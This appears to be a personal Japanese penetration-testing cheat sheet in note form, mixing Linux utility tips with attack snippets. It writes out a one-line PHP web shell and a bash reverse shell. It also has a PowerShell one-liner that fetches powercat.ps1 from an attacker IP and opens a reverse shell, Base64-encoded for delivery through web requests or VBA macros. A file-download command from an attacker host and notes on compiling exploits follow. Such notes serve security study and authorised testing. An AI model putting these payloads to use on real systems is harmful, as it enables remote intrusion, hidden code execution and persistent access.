# Linuxでファイルの検索と権限の同時表示

```zsh
find / -name [file] -type f 2>/dev/null | xargs ls -la
```
- 「コマンドA | xargs コマンドB」で、コマンドAの実行結果を引数にしてコマンドBを実行

---

# シンプルなPHP Webシェル

```php
<?php echo system($_GET["cmd"]); ?>
```

---

# bashでリバースシェルを確立する基本的なコマンド

- [ ] What is the shellにまとめる

Linuxで可能
```zsh
bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```

- 例えばこれをさらに`''`で囲んで実行するときなどは`''`をエスケープ処理すること
```zsh
'system("bash -c \"bash -i >& /dev/tcp/[IP]/[PORT] 0>&1\"")'
```

⚠️必要に応じてURLエンコードすること
詳細は[[What is the shell]]

---

# PowerShellワンライナーのBase64エンコード化

[ ] What is the shellにまとめる

- Web経由やVBAマクロ経由で実行するときによく使う

1.  攻撃者マシンでpowershellを開く
```zsh
pwsh
```

2. 変数に実行したいコマンドをワンライナーで代入する
```powershell
$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell"
```

3. Base64エンコードする
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
```

4. エンコード結果を表示し、メモした後、PowerShellからexitする
```powershell
$EncodedText
exit
```

- 補足：エンコード後のPowerShellコマンド実行方法
```
powershell.exe -nop -enc [$EncodedTextの出力]
```
- `-nop`：No Profile。プロファイルスクリプト(`$PROFILE`)を読み込まないようにする。プロファイルにはユーザーごとのカスタム設定やコマンドが含まれる
- `-w hidden`：PowerShell実行ウィンドウが非表示となる。マクロで使われる。

---

# PowershellでのPowerShellスクリプトのダウンロード

```powershell
(New-Object Net.WebClient).DownloadFile('http://[AttackerIP]:[Port]/[FileName]', '[path to download]') 
```
- `New-Object` コマンドレットを使用して `Net.WebClient` クラスの新しいインスタンスを作成している。`Net.WebClient` は実際には `System.Net.WebClient` クラスの省略形。NETフレームワークの。
- `System.Net.WebClient` クラスのインスタンスが生成されると、このインスタンスによりWebサーバーとの通信が可能になり、指定したURLからファイルをダウンロードするために `.DownloadFile` メソッドが利用できるようになる

---

# Kali Linuxでssh

- スタート
```zsh
sudo service ssh start
```
- 確認
```zsh
sudo systemctl status ssh
```
- FWの設定で22ポートを許可する
```zsh
sudo iptables -I INPUT -p tcp --dport 22 -j ACCEPT
```
- 確認
```zsh
sudo iptables -L
```

- FWの設定を取り消す
```zsh
sudo iptables -D INPUT -p tcp --dport 22 -j ACCEPT
```
- ストップする
```zsh
sudo service ssh stop
```

- *注意*：winRMから接続したときは対話的なターミナルを開くことができないのでエラーが起きるが、ssh自体は問題なく使える。

---

# C言語ファイルのコンパイル・実行手順

⚠️：Windows環境でコンパイルすることを想定しているファイルはKali Linux上でコンパイル不可

1. コンパイル
```zsh
gcc [example.c] -o [example]
```
- コンパイル時にエラーが出た場合は、オプション `-Wall` を使って詳細エラーを見る。

エラー例と対処：
- `undefined reference to 'get_kernel_syms'` → 古いカーネル用。新しいカーネルでは使えない。
- `implicit declaration of function 'printf'` → `#include <stdio.h>` が必要。

2. 実行
```zsh
./[example]
```
- 一部は引数を必要とするものもあるので、`./exploit --help` や `cat exploit.c` で使用法を確認すること

---

# 文字の変換

抽出
```zsh
# 例：awk -F: '{print $1}' test.txt
awk -F<区切り文字> '{print $<num>}' <file>
```
- admin:testとあるとき、`{print $1}`とすることで、adminを抽出

デコード
```zsh
echo '<string>' | base64 -d
echo '<biinary_char>' | xxd -p
```